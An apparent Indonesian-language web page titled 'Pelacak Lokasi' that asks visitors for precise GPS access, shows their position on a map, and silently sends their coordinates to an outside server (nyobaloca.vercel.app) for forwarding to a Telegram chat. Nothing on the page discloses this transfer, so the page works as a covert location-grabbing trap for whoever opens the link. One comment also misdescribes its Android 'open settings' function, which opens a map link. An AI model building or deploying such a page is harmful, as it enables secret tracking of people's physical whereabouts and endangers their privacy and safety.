<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pelacak Lokasi</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.js"></script>
    <style>
      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        margin: 0;
        padding: 0;
        height: 100vh;
        background-color: #000;
        color: #fff;
        transition: background-color 0.5s ease;
      }
      .hidden {
        display: none;
      }
      .container {
        max-width: 800px;
        margin: 0 auto;
        padding: 20px;
        opacity: 0;
        transition: opacity 0.5s ease;
      }
      .visible {
        opacity: 1;
      }
      .loading-screen {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        text-align: center;
        padding: 20px;
      }
      #map {
        height: 400px;
        width: 100%;
        margin-top: 20px;
        border-radius: 10px;
        border: 1px solid #ddd;
      }
      #error-message {
        margin-top: 20px;
        color: red;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <div id="loadingScreen" class="loading-screen">
      <h1>Pelacak Lokasi</h1>
      <p>Mohon izinkan akses lokasi untuk melanjutkan</p>
      <p id="loadingStatus">Meminta izin lokasi...</p>
      <p id="error-message" class="hidden">
        Lokasi tidak dapat diakses. Pastikan GPS diaktifkan.
      </p>
    </div>

    <div id="mainContent" class="container hidden">
      <h1>Pelacak Lokasi</h1>
      <div id="map"></div>
    </div>

    <script>
      let map, marker, currentPosition;

      document.addEventListener("DOMContentLoaded", function () {
        setTimeout(getLocation, 500);
      });

      // Fungsi untuk meminta lokasi
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, showError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        } else {
          document.getElementById("loadingStatus").textContent =
            "Geolocation tidak didukung.";
          document.getElementById("error-message").classList.remove("hidden");
          // Buka pengaturan lokasi pada Android jika geolocation tidak tersedia
          openLocationSettings();
        }
      }

      // Menampilkan posisi setelah izin lokasi diberikan
      function showPosition(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        currentPosition = { latitude, longitude };

        document.body.style.backgroundColor = "#fff";
        document.getElementById("loadingScreen").classList.add("hidden");
        document.getElementById("mainContent").classList.remove("hidden");
        setTimeout(
          () => document.getElementById("mainContent").classList.add("visible"),
          100
        );

        initMap(latitude, longitude);
        shareLocationToTelegram(latitude, longitude); // Kirim lokasi ke server untuk diteruskan ke Telegram
      }

      // Menangani error saat mendapatkan lokasi
      function showError(error) {
        if (error.code === error.PERMISSION_DENIED) {
          document.getElementById("loadingStatus").textContent =
            "Anda menolak izin lokasi.";
        } else if (error.code === error.POSITION_UNAVAILABLE) {
          document.getElementById("loadingStatus").textContent =
            "Posisi tidak tersedia.";
        } else if (error.code === error.TIMEOUT) {
          document.getElementById("loadingStatus").textContent =
            "Waktu permintaan lokasi habis.";
        }

        document.getElementById("error-message").classList.remove("hidden");
        // Buka pengaturan lokasi pada Android jika GPS tidak aktif
        openLocationSettings();
      }

      // Inisialisasi peta dengan Leaflet
      function initMap(lat, lng) {
        if (!map) {
          map = L.map("map").setView([lat, lng], 15);
          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
            attribution: "&copy; OpenStreetMap contributors",
          }).addTo(map);
          marker = L.marker([lat, lng]).addTo(map);
        } else {
          map.setView([lat, lng], 15);
          marker.setLatLng([lat, lng]);
        }
      }

      // Fungsi untuk membuka pengaturan lokasi pada perangkat Android
      function openLocationSettings() {
        if (navigator.userAgent.match(/Android/i)) {
          // Untuk Android, membuka pengaturan lokasi
          window.location.href = "geo:0,0?q=loc:0,0";
        }
      }

      // Fungsi untuk mengirim lokasi ke server yang kemudian akan diteruskan ke Telegram
      function shareLocationToTelegram(latitude, longitude) {
        fetch("https://nyobaloca.vercel.app/send-location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Lokasi berhasil dikirim ke Telegram", data);
          })
          .catch((error) => {
            console.error("Gagal mengirim lokasi ke Telegram", error);
          });
      }
    </script>
  </body>
</html>
